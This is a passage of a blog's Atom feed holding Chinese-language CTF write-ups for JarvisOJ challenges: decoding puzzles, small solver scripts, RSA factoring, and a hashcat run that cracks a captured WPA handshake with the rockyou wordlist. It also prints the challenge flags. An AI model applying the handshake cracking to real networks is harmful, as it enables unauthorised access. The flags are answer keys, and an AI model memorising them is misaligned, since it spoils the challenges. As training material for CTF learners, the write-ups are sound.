@@ -1,0 +1,937 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+	<title>LuckyDog | CSUwangj&#x27;s Blog - Web</title>
+	<link href="https://CSUwangj.github.io/tags/Web/atom.xml" rel="self" type="application/atom+xml"/>
+  <link href="https://CSUwangj.github.io/"/>
+	<generator uri="https://www.getzola.org/">Zola</generator>
+	<updated>2020-08-07T01:54:43.005696+08:00</updated>
+	<id>https://CSUwangj.github.io/tags/Web/atom.xml</id>
+	<entry xml:lang="en">
+		<title>JarvisOJ-WP合集</title>
+		<published>2018-05-10T09:11:00+08:00</published>
+		<updated>2020-08-07T01:54:43.005696+08:00</updated>
+		<link rel="alternate" href="https://CSUwangj.github.io/jarvisoj-wphe-ji/" type="text/html"/>
+		<id>https://CSUwangj.github.io/jarvisoj-wphe-ji/</id>
+		<content type="html">&lt;p&gt;因为预感进度表会很长，所以不放了&lt;&#x2F;p&gt;
+&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;h1 id=&quot;bu-zi-ci-tiao-zhuan-de-jin-du-biao&quot;&gt;不资瓷跳转的进度表&lt;&#x2F;h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+Basic
+&lt;ul&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+base64&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+关于USS Lab.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+veryeasy&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+段子&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+手贱&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+美丽的实验室logo&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+神秘的文件&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+公倍数&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+Easy Crackme&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+Secret&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+爱吃培根的出题人&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+Easy RSA&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+ROPGadget&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+取证&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+熟悉的声音&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+Baby&#x27;s Crack&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+Help!!&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+Shellcode&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+A Piece Of Cake&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+-.-字符串&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+德军的密码&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+握手包&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+Crypto
+&lt;ul&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+Medium RSA&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&#x2F;&gt;
+BrokenPic&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot; checked=&quot;&quot;&#x2F;&gt;
+hard RSA&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h1 id=&quot;x-basic&quot;&gt;[Ｘ] Basic&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;x-base64&quot;&gt;[Ｘ] base64&lt;&#x2F;h2&gt;
+&lt;p&gt;注意到没有小写字母和大点的数字，猜测是base32，解完以后是一个十六进制字符串，转ASCII解得&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{Just_t3st_h4v3_f4n}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-guan-yu-uss-lab&quot;&gt;[Ｘ] 关于USS Lab.&lt;&#x2F;h2&gt;
+&lt;p&gt;搜索得到答案，注意题目里说的是USS Lab。&lt;&#x2F;p&gt;
+&lt;p&gt;顺便其实点开about就能看到全称（233&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-1&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{ubiquitous_system_security}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-veryeasy&quot;&gt;[Ｘ] veryeasy&lt;&#x2F;h2&gt;
+&lt;p&gt;打开文件我就知道要用strings命令，但是我就不，我就翻&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-2&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{strings_i5_3asy_isnt_i7}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-duan-zi&quot;&gt;[Ｘ] 段子&lt;&#x2F;h2&gt;
+&lt;p&gt;将锟斤拷存ANSI编码，然后HEX编辑器打开就好&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-3&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{EFBFBDEFBFBD}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-shou-jian&quot;&gt;[Ｘ] 手贱&lt;&#x2F;h2&gt;
+&lt;p&gt;直接解MD5，然后发现说不是标准MD5值，发现长度为33&lt;&#x2F;p&gt;
+&lt;p&gt;再看看具体的，发现里面有个$L$的小写，删了解MD5得flag&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-4&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{hack}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-mei-li-de-shi-yan-shi-logo&quot;&gt;[Ｘ] 美丽的实验室logo&lt;&#x2F;h2&gt;
+&lt;p&gt;binwalk没有额外东西&lt;&#x2F;p&gt;
+&lt;p&gt;但是可以发现不是裸的jpg，strings可以看到Adobe公司工具编辑的痕迹，回去继续&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;p&gt;不对，用Stegsolver的Frame Browser看到了flag&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-5&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{You_are_R3ally_Car3ful}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-veryeasyrsa&quot;&gt;[Ｘ] veryeasyRSA&lt;&#x2F;h2&gt;
+&lt;p&gt;RSA-tool直接上啦~&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525919629975.png&quot; alt=&quot;veryeasyRSA&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-6&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{19178568796155560423675975774142829153827883709027717723363077606260717434369}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-shen-mi-de-wen-jian&quot;&gt;[Ｘ] 神秘的文件&lt;&#x2F;h2&gt;
+&lt;p&gt;file&#x2F;binwalk指令得到这是一个exT文件系统数据，strings结果也奇怪&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525920969858.png&quot; alt=&quot;神秘的文件&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;索性打开文件看，发现有一堆\x00&lt;&#x2F;p&gt;
+&lt;p&gt;但是往下翻发现有些其他东西&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525921057979.png&quot; alt=&quot;神秘的文件_2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;然后找到P&#x2F;C&#x2F;T，想着能不能移除&lt;code&gt;\x00&lt;&#x2F;code&gt;得到flag&lt;&#x2F;p&gt;
+&lt;p&gt;然后的确得到了，但是结果失败了&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525922016986.png&quot; alt=&quot;神秘的文件_3&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;因为错位包括前后错位，所以直接拼凑也是会失败的&lt;&#x2F;p&gt;
+&lt;p&gt;看来还是需要文件系统，用命令&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;mount -o loop haha.f38a74f55b4e193561d1b707211cf7eb &#x2F;mnt&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;装载文件系统之后，发现每个文件里一个字符，所以写出脚本&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;import os
+s = &amp;quot;&amp;quot;
+for i in range(0, 254):
+	f = open(str(i), &amp;quot;r&amp;quot;)
+	s += f.read()
+	f.close()
+print(s)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;得到flag&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-7&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{P13c3_7oghter_i7}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-gong-bei-shu&quot;&gt;[Ｘ] 公倍数&lt;&#x2F;h2&gt;
+&lt;p&gt;1s大概做1e8的计算，所以可以直接暴力算就好&lt;&#x2F;p&gt;
+&lt;p&gt;代码就没必要放了吧~&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-8&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{233333333166666668}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-easy-crackme&quot;&gt;[Ｘ] Easy Crackme&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525966589251.png&quot; alt=&quot;Easy Crackme&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;算法很简单，第一位异或以后，后面24位每6位一组和对应位置异或，然后进行比较&lt;&#x2F;p&gt;
+&lt;p&gt;写出逆算法&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp &quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;#include &amp;lt;bits&amp;#x2F;stdc++.h&amp;gt;
+using namespace std;
+unsigned char a[27] = {
+    0xFB, 0x9E, 0x67, 0x12, 0x4E, 0x9D, 0x98, 0xAB, 0x00, 0x06, 0x46, 0x8A, 0xF4, 0xB4, 0x06, 0x0B,
+    0x43, 0xDC, 0xD9, 0xA4, 0x6C, 0x31, 0x74, 0x9C, 0xD2, 0xA0, 0
+};
+int ar[6] = {-35,51,84,53,-17,-85};
+int main()
+{
+	a[0]^=0xab;
+	for(int i=0;i&amp;lt;25;++i){
+		a[i+1]^=ar[i%6];
+	}
+	puts((const char *)a);
+    return 0;
+}
+
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;flag-9&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{r3v3Rse_i5_v3ry_eAsy}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-secret&quot;&gt;[Ｘ]  Secret&lt;&#x2F;h2&gt;
+&lt;p&gt;打开，F12，网络，刷新，得到&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525960605970.png&quot; alt=&quot;Secret&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-10&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{Welcome_to_phrackCTF_2016}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-ai-chi-pei-gen-de-chu-ti-ren&quot;&gt;[Ｘ]  爱吃培根的出题人&lt;&#x2F;h2&gt;
+&lt;p&gt;提示够明显了，小写字母-&amp;gt;A，大写字母-&amp;gt;B，&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;mothereff.in&#x2F;bacon&quot;&gt;培根密码解密&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-11&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;h2 id=&quot;x-easy-rsa&quot;&gt;[Ｘ] Easy RSA&lt;&#x2F;h2&gt;
+&lt;p&gt;提示明显&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-12&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{3a5Y}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-ropgadget&quot;&gt;[Ｘ] ROPGadget&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525961626864.png&quot; alt=&quot;ROPGadget&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-13&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{94C38B08890A5BC3}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-qu-zheng&quot;&gt;[Ｘ] 取证&lt;&#x2F;h2&gt;
+&lt;p&gt;搜索得软件名Volatility&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-14&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{volatility}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-shou-xi-de-sheng-yin&quot;&gt;[Ｘ] 熟悉的声音&lt;&#x2F;h2&gt;
+&lt;p&gt;摩尔斯-&amp;gt;凯撒&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-15&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{PHRACKCTF}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-baby-s-crack&quot;&gt;[Ｘ] Baby&#x27;s Crack&lt;&#x2F;h2&gt;
+&lt;p&gt;很简单的加密，都不用写逆算法了，直接爆破吧！&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+char a[] = &amp;quot;jeihjiiklwjnk{ljj{kflghhj{ilk{k{kij{ihlgkfkhkwhhjgly&amp;quot;;
+char b[] = &amp;quot;jeihjiiklwjnk{ljj{kflghhj{ilk{k{kij{ihlgkfkhkwhhjgly&amp;quot;;&amp;#x2F;&amp;#x2F;这里可以为空，我只是方便设置长度搞得
+int main()
+{
+	int len = strlen(a);
+	for(int i=0;i&amp;lt;len;++i){
+		int ok = 0;
+		for(int j=32;j&amp;lt;255&amp;amp;&amp;amp;!ok;++j){
+			int cur = j;
+			if ( j &amp;gt; 47 &amp;amp;&amp;amp; j &amp;lt;= 96 ){
+          		j += 53;
+        	}else if ( j &amp;lt;= 46 ){
+          		j += j % 11;
+        	}else{
+          		j = 61 * (j &amp;#x2F; 61);
+        	}
+        	if(j==a[i]){
+        		&amp;#x2F;&amp;#x2F;ok=1;这里加上注释是为了确认每次解的唯一
+        		b[i]=cur;
+        		putchar(cur);
+        	}
+        	j=cur;
+        }
+        putchar(&amp;#x27;\n&amp;#x27;);
+    }
+    puts(b);
+	return 0;
+}
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;得到的结果转ASCII就好&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-16&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{You_ar3_Good_Crack3R}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-help&quot;&gt;[Ｘ] Help!!&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525968750571.png&quot; alt=&quot;Help!!&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;打开word没有发现flag，binwalk&#x2F;strings也没有&lt;&#x2F;p&gt;
+&lt;p&gt;于是解压word，发现有两张图，OK&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-17&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{You_Know_moR3_4boUt_woRd}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-shellcode&quot;&gt;[Ｘ] Shellcode&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525973282058.png&quot; alt=&quot;Shellcode&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-18&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{Begin_4_good_pwnn3r}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-a-piece-of-cake&quot;&gt;[Ｘ] A Piece Of Cake&lt;&#x2F;h2&gt;
+&lt;p&gt;一眼就看出来是单表替换，quip解决&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-19&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{substitutepassisveryeasyyougotit}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-zi-fu-chuan&quot;&gt;[Ｘ] -.-字符串&lt;&#x2F;h2&gt;
+&lt;p&gt;一目了然&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-20&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;522018D665387D1DA931812B77763410&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-de-jun-de-mi-ma&quot;&gt;[Ｘ] 德军的密码&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;jarvisoj-wphe-ji&#x2F;1525970989136.png&quot; alt=&quot;德军的密码&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;然后解得flag&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-21&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;WELCOMECISRG&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;x-wo-shou-bao&quot;&gt;[Ｘ] 握手包&lt;&#x2F;h2&gt;
+&lt;p&gt;下载发现是个cap包，中文搜索无果，搜&amp;quot;Kali handshake crack&amp;quot;，搜到hashcat，找到&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;hashcat.net&#x2F;wiki&#x2F;doku.php?id=cracking_wpawpa2&quot;&gt;这个网站&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;照葫芦画瓢&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;A:\Downloads\Compressed\hashcat-4.1.0
+λ hashcat64.exe -m 2500 9640_1525972232.hccapx rockyou.txt
+hashcat (v4.1.0) starting...
+
+* Device #1: WARNING! Kernel exec timeout is not disabled.
+             This may cause &amp;quot;CL_OUT_OF_RESOURCES&amp;quot; or related errors.
+             To disable the timeout, see: https:&amp;#x2F;&amp;#x2F;hashcat.net&amp;#x2F;q&amp;#x2F;timeoutpatch
+* Device #2: Intel&amp;#x27;s OpenCL runtime (GPU only) is currently broken.
+             We are waiting for updated OpenCL drivers from Intel.
+             You can use --force to override, but do not report related errors.
+nvmlDeviceGetFanSpeed(): Not Supported
+
+OpenCL Platform #1: NVIDIA Corporation
+======================================
+* Device #1: GeForce GTX 965M, 512&amp;#x2F;2048 MB allocatable, 8MCU
+
+OpenCL Platform #2: Intel(R) Corporation
+========================================
+* Device #2: Intel(R) HD Graphics 530, skipped.
+* Device #3: Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz, skipped.
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5&amp;#x2F;13 rotates
+Rules: 1
+
+Applicable optimizers:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Slow-Hash-SIMD-LOOP
+
+Minimum password length supported by kernel: 8
+Maximum password length supported by kernel: 63
+
+Watchdog: Temperature abort trigger set to 90c
+
+Dictionary cache built:
+* Filename..: rockyou.txt
+* Passwords.: 14344390
+* Bytes.....: 139921496
+* Keyspace..: 14344383
+* Runtime...: 3 secs
+
+e56452df7244988624af174fa692d81d:560a64ffe917:b8ee65ac640b:Flag_is_here:11223344
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: WPA&amp;#x2F;WPA2
+Hash.Target......: Flag_is_here (AP:56:0a:64:ff:e9:17 STA:b8:ee:65:ac:64:0b)
+Time.Started.....: Fri May 11 01:17:21 2018 (3 secs)
+Time.Estimated...: Fri May 11 01:17:24 2018 (0 secs)
+Guess.Base.......: File (rockyou.txt)
+Guess.Queue......: 1&amp;#x2F;1 (100.00%)
+Speed.Dev.#1.....:    91621 H&amp;#x2F;s (10.79ms) @ Accel:32 Loops:16 Thr:1024 Vec:1
+Recovered........: 1&amp;#x2F;1 (100.00%) Digests, 1&amp;#x2F;1 (100.00%) Salts
+Progress.........: 593466&amp;#x2F;14344383 (4.14%)
+Rejected.........: 331322&amp;#x2F;593466 (55.83%)
+Restore.Point....: 0&amp;#x2F;14344383 (0.00%)
+Candidates.#1....: 123456789 -&amp;gt; rinabelle
+HWMon.Dev.#1.....: Temp: 68c Util: 98% Core:1151MHz Mem:2505MHz Bus:16
+
+Started: Fri May 11 01:17:04 2018
+Stopped: Fri May 11 01:17:25 2018
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;flag-22&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;flag{11223344}&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;crypto&quot;&gt;[　] Crypto&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;x-medium-rsa&quot;&gt;[Ｘ] Medium RSA&lt;&#x2F;h2&gt;
+&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;λ openssl rsa -pubin -in pubkey.pem -text -modulus
+WARNING: can&amp;#x27;t open config file: &amp;#x2F;usr&amp;#x2F;local&amp;#x2F;ssl&amp;#x2F;openssl.cnf
+Public-Key: (256 bit)
+Modulus:
+    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:
+    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:
+    be:30:dd
+Exponent: 65537 (0x10001)
+Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD
+writing RSA key
+-----BEGIN PUBLIC KEY-----
+MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ&amp;#x2F;+5erCQKPGqxsC&amp;#x2F;bNPXDr
+yigb&amp;#x2F;+l&amp;#x2F;vjDdAgMBAAE=
+-----END PUBLIC KEY-----
+
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;然后分解这个数，用RSAtools输出私钥文件&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;λ python rsatool.py -f PEM -o key.pem -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048 041239
+Using (p, q) to initialise RSA instance
+
+n =
+c2636ae5c3d8e43ffb97ab09028f1aac6c0bf6cd3d70ebca281bffe97fbe30dd
+
+e = 65537 (0x10001)
+
+d =
+1806799bd44ce649122b78b43060c786f8b77fb1593e0842da063ba0d8728bf1
+
+p = 275127860351348928173285174381581152299 (0xcefbb2cf7e18a98ebedc36e3e7c3b02b)
+
+q = 319576316814478949870590164193048041239 (0xf06c28e91c8922b9c236e23560c09717)
+
+Saving PEM as key.pem
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;之后解密&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;λ openssl rsautl -decrypt -inkey key.pem -in flag.enc -out flag&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flag-23&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;p&gt;PCTF{256b_i5_m3dium}&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;brokenpic&quot;&gt;[　] BrokenPic&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;flag-24&quot;&gt;flag&lt;&#x2F;h3&gt;
+&lt;h2 id=&quot;x-hard-rsa&quot;&gt;[Ｘ] hard RSA&lt;&#x2F;h2&gt;
+&lt;h2 id=&quot;rsa-yan-sheng-suan-fa-rabin-suan-fa&quot;&gt;RSA 衍生算法——Rabin 算法&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;gong-ji-tiao-jian&quot;&gt;攻击条件&lt;&#x2F;h3&gt;
+&lt;p&gt;Rabin 算法的特征在于 $e=2​$。&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;gong-ji-yuan-li&quot;&gt;攻击原理&lt;&#x2F;h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;密文：&lt;&#x2F;p&gt;
+&lt;p&gt;$c=m^2\mod n$&lt;&#x2F;p&gt;
+&lt;p&gt;解密：&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;计算出 $m^p$ 和 $m^q$：&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;$$m_p=\sqrt{c}\mod p$$&lt;&#x2F;p&gt;
+&lt;p&gt;$$m_q=\sqrt{c}\mod q$$&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;用扩展欧几里得计算出 $y_p$ 和 $y_q$：&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;$y_p⋅p+y_q⋅q=1$&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;解出四个明文：&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;$$a=(y_p⋅p⋅m_q+y_q⋅q⋅m_p)modn$$&lt;&#x2F;p&gt;
+&lt;p&gt;$$b=n−a$$&lt;&#x2F;p&gt;
